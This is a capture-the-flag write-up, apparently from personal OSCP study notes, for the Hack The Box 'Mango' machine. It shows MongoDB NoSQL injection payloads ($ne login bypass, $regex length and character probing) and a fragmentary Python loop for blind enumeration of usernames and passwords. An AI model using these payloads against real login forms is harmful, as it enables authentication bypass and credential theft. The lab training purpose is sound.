## Mango

https://app.hackthebox.com/machines/Mango

This machine has been resolved on OSCP machines: [Mango](https://github.com/b1d0ws/OSCP/tree/main/TJ%20Null's%20List/Linux%20Boxes/Mango)

The objective here is automate the NOSQL Injection on login.

Login Request
```
username=admin&password=admin&login=login
```

Simple bypass returns 302 instead of 200.
```
username=admin&password[$ne]=admin&login=login
```

<br>

In NodeJS, using JSON, this would be something like:
```
# Remember changing to Content-Type: application/json
{
"username": "admin",
"password": { "$ne": "admin"}
"login":"login"
}
```

<br>

Discovering length of usernames (this consults all usernames)
```
# Status 200 - No username with 1 character
username[$regex]=^.{1}$&password[$ne]=admin&login=login

# Status 302 - Finds user with 5 characers, probably "admin"
username[$regex]=^.{5}$&password[$ne]=admin&login=login
```

<br>

Scripts **enum-user.py** and **enum-pass.py** are basic and made based on [IppSec's video](https://www.youtube.com/watch?v=NO_lsfhQK_s&t=1300s).

The payload uses regex. On this payload, the word "l" is being rotate to find "n", the last character of this username.
```
username[$regex]=^admil&password[$ne]=admin&login=login
```

On this scripts, we check if the username is completed using this validation:
```
data = { "username[$regex]":"^" + payload + "$", "password[$ne]":"admin", "login":"login" }

username[$regex]=^admin$&password[$ne]=admin&login=login
```

<br>

But we could also use other logics like:
```python
for firstChar in characters:
  # Scroll through the alphabet
  if r.status_code != 302:
    # If character doesn't match the pattern, go to the next character
    continue;
  
  # If it finds the character, starts scrolling throug the alphabet again, searching for the next one
  loop = True
  userpass = firstChar

  while loop:
    loop = False
    
    for char in characters:
      if r.status_code == 302:
      print(Fore.YELLOW + "Pattern found: " + payload)
      userpass = payload
      # If finds another character, stays on this loop, if not, back to the first character and continues to find other usernames
      loop = True
```

<br>

These are other scripts that uses recursive function to search for every character even if it already find one.  
[Hacktricks Brute-force login usernames and passwords from POST login](https://book.hacktricks.xyz/pentesting-web/nosql-injection)  
[Nosql injection username and password enumeration script](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration/tree/master)
